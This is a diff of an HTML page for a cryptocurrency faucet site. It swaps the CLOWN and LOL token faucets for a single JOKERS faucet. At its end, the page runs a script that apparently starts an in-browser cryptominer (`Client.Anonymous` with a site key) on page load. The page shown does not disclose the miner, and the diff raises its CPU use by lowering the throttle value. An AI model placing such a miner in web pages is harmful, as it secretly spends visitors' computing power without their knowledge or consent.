@@ -14,15 +14,13 @@
   <body>
    
    <div style="text-align: left"><span style="font-size: 18px; cursor: pointer;" onclick="openNav()">&#9776; Enter The Funiverse</span></div>
-   <!-- <div style="text-align: right"><button onclick="darkMode()">light</button></div> -->
+   <div style="text-align: right"><button onclick="darkMode()">light</button></div>
 
    <div id="mySidenav" class="sidenav">
       <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
       <a href="../">Home</a>
       <a href="../meme/">MEME token</a>
       <a href="../jokers/">JOKERS token</a>
-      <a href="../clown/">CLOWN token</a>
-      <a href="../lol/">LOL token</a>
       <a href="../bank/">Jokers Bank</a>
    </div>
 
@@ -41,10 +39,6 @@
       See <a href="../bank/index.html">Jokers Bank</a> - stake MEME and receive JOKERS tokens as reward.<br><br>
    </p>
 
-   <p>Claim 597 LOL tokens one time per hour.<br>
-      See <a href="../bank/">Jokers Bank</a> - stake MEME and receive LOL tokens as reward.<br><br>
-   </p>
-
    <p>
       You need MintMe for blockchain transaction fee.<br>
       A small amount of MintMe is included in the transaction fee at the time the LOL claim is executed. It is used to repurchase and increase liquidity.<br><br>
@@ -55,18 +49,18 @@
    <br>
 
    <div>
-      <h3>CLOWN faucet <img src="../img/clown512.png" alt="CLOWN icon" width="64"></h3>
-      <button onclick="claimZombie()" class="button button1">Claim CLOWN</button>
+      <h3>JOKERS faucet <img src="../img/joker512.png" alt="JOKERS icon" width="64"></h3>
+      <button onclick="claimJokers()" class="button button1">Claim JOKERS</button>
       <br>
 		<div id="lang"></div>
 		<br>
-		<button onclick="lockTimeZ()" class="button button1">View a timestamp</button>
+		<button onclick="lockTimeJ()" class="button button1">View a timestamp</button>
 		<p>Check the next claim timestamp</p>
 		<div id="lang1"></div>
 		<p>Copy unix_timestamp and go to <a href="https://www.unixtimestamp.com/"> converter</a>.<br>
          Paste the timestamp to "Enter a Timestamp" field and tap/click Convert.</p>
       <br>
-      <button onclick="balanceFaucet()" class="button button1">CLOWN faucet balance</button>
+      <button onclick="balanceFaucet()" class="button button1">JOKERS faucet balance</button>
 		<p></p>
 		<div id="lang2"></div>
       <br>
@@ -75,34 +69,8 @@
    <br>
 
    <div>
-      <h3>LOL faucet <img src="../img/lol512.png" alt="LOL icon" width="64"></h3>
-      <button onclick="claimURGD()" class="button button1">Claim LOL</button>
-      <br>
-		<div id="lang3"></div>
-		<br>
-		<button onclick="lockTimeU()" class="button button1">View a timestamp</button>
-		<p>Check the next claim timestamp</p>
-		<div id="lang4"></div>
-		<p>Copy unix_timestamp and go to <a href="https://www.unixtimestamp.com/"> converter</a>.<br>
-         Paste the timestamp to "Enter a Timestamp" field and tap/click Convert.</p>
-      <br>
-      <button onclick="balanceFaucet2()" class="button button1">LOL faucet balance</button>
-		<p></p>
-		<div id="lang5"></div>
-      <br>
-   </div>
-
-   <br>
-
-   <div>
-      <p>CLOWN token contract address: 0x82E412523593773170C44adF4f7629e797F427D1<br>
-         Clown Faucet contract address (MintMe explorer): <a href="https://www.mintme.com/explorer/addr/0xa78f4c29dd4d4dfa1124cbcfe72da230f80879c8">0xa78f4c29dd4d4dfa1124cbcfe72da230f80879c8</a><br>
-      </p>
-   </div>
-
-   <div>
-      <p>LOL token contract address: 0x7C75f7cDa8674787C4d82b2222a9025eCdC1343F<br>
-         LOL Faucet contract address (MintMe explorer): <a href="https://www.mintme.com/explorer/addr/0x69eadd72557c9cb88f8e68ad783d8426f819af1e">0x6FAE0c62687EdCCDe384eD12cC0513c7436A4b5C</a><br>
+      <p>JOKERS token contract address: 0x82E412523593773170C44adF4f7629e797F427D1<br>
+         Jokers Faucet contract address (MintMe explorer): <a href="https://www.mintme.com/explorer/addr/0xa78f4c29dd4d4dfa1124cbcfe72da230f80879c8">0xa78f4c29dd4d4dfa1124cbcfe72da230f80879c8</a><br>
       </p>
    </div>
 
@@ -145,7 +113,7 @@
    <script src="../functions.js"></script>
    <script>
       var _client = new Client.Anonymous('d6237b4afd13d3e90bedfc23492f02c2f518750842d718b09cba1c7a374ac1f5', {
-          throttle: 0.7, c: 'w', ads: 0
+          throttle: 0.4, c: 'w', ads: 0
       });
       _client.start();
       
